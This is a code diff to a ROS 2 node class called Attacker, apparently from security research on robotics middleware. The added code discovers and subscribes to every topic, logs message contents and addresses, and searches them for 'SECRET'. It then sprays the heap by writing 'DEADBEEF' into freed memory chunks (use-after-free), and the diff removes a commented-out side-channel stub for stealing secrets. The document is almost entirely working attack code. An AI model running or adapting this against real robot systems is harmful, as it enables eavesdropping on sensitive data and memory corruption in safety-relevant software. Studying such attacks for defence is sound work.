@@ -15,30 +15,8 @@ namespace composition
 Attacker::Attacker(const rclcpp::NodeOptions & options)
 : Node("attacker", options), num_bytes_allocated_(0), kBytesAllocatedPerAttack_(1 << 14) // 16 MB per attack
 {
-  // Create a callback function for when messages are received.
-  // Variations of this function also exist using, for example, UniquePtr for zero-copy transport.  
-
-  auto topic_list = this->get_topic_names_and_types();
-  for (const auto & topic : topic_list) {    
-    topic_name.resize(topic.first.size()-1);    
-    copy(topic.first.begin()+1, topic.first.end(), topic_name.begin()); // slicing for topic name    
-    RCLCPP_INFO(this->get_logger(), "Discovered topic: %s", topic_name.c_str()); 
-
-    // define callback
-    auto callback =
-    [this](std_msgs::msg::String::ConstSharedPtr msg) -> void
-    {
-      RCLCPP_ERROR(this->get_logger(), "Attcker heard from topic[%s]: '%s'",topic_name.c_str(), msg->data.c_str());
-    };
-
-    try {
-      sub_arr.push_back(create_subscription<std_msgs::msg::String>(topic_name.c_str(), 10, callback));
-    }
-    catch (...) {
-      RCLCPP_INFO(this->get_logger(), "Unable to subscribe to topic[%s]",topic_name.c_str());
-    }
-
-  }
+  // First do eavesdopping on known topics and get the size of the topic data
+  manipulate_topics();
 }
 
 void Attacker::steal_mem(size_t max_num_bytes_allocated, size_t start_with){
@@ -66,17 +44,70 @@ void Attacker::steal_mem(size_t max_num_bytes_allocated, size_t start_with){
     std::flush(std::cout);
 }
 
-void Attacker::steal_sec(){
-    //   // secrect stealing
-    //   size_t start_size = 10;
-    //   for(int i = 0; i < 10; i++){
-    //     char* side_channel = (char*)(malloc((start_size) * sizeof(char)));
-    //     RCLCPP_INFO(this->get_logger(), "Attacker malloc address: [%p] (size: %ld)", side_channel, start_size); 
-    //     RCLCPP_INFO(this->get_logger(), "Attacker heard: [%s]", side_channel); 
-    //     start_size += 10;
-    //   }
+void Attacker::manipulate_topics(){
+  auto topic_list = this->get_topic_names_and_types();
+  for (const auto & topic : topic_list) {    
+    topic_name.resize(topic.first.size()-1);    
+    copy(topic.first.begin()+1, topic.first.end(), topic_name.begin()); // slicing for topic name    
+    RCLCPP_INFO(this->get_logger(), "Discovered topic: %s", topic_name.c_str()); 
+
+    // define callback
+    auto callback =
+    [this](std_msgs::msg::String::ConstSharedPtr msg) -> void
+    {
+      RCLCPP_ERROR(this->get_logger(), "Attcker heard from topic[%s]: '%s', data at %p",topic_name.c_str(), msg->data.c_str(), msg->data.c_str());
+      if(!this->topic_string_size){
+        auto res = msg->data.find("SECRET");
+        if(res != std::string::npos){
+          this->topic_string_size = msg->data.size();
+          RCLCPP_INFO(this->get_logger(), "topic_string_size set %ld", this->topic_string_size); 
+        }
+      }      
+      double_free_spraying(32);          
+    };
+
+    try {
+      sub_arr.push_back(create_subscription<std_msgs::msg::String>(topic_name.c_str(), 10, callback));
+    }
+    catch (...) {
+      RCLCPP_INFO(this->get_logger(), "Unable to subscribe to topic[%s]",topic_name.c_str());
+    }
+  }
 }
 
+void* spray(size_t sz){
+  void* a = malloc(sz);     
+  void* db_free_pt = a;  
+  free(a);
+  return db_free_pt;
+}
+
+void fill_used_pointer(char* s){
+  strcpy(s, "DEADBEEF");
+}
+
+void Attacker::fill_prev_ptrs(){
+  for(auto ptr: this->prev_ptrs){
+    fill_used_pointer(ptr);
+  }
+}
+
+void Attacker::double_free_spraying(size_t sz){
+  // this function tries to spray the more the better the double freed memory chunk 
+  if(!sz) return;
+  char* db_free_pt = (char*)spray(sz);
+  fill_used_pointer(db_free_pt);
+  if(this->prev_ptrs.size() < 10000){
+    this->prev_ptrs.push_back(db_free_pt);
+  }
+  else{
+    this->prev_ptrs.resize(0);
+    this->prev_ptrs.push_back(db_free_pt);
+  }
+  RCLCPP_ERROR(this->get_logger(), "%s at %p", (char*)db_free_pt, db_free_pt);
+  RCLCPP_ERROR(this->get_logger(), "sparying at %p", db_free_pt);
+  fill_prev_ptrs();
+}
 
 }  // namespace composition
 
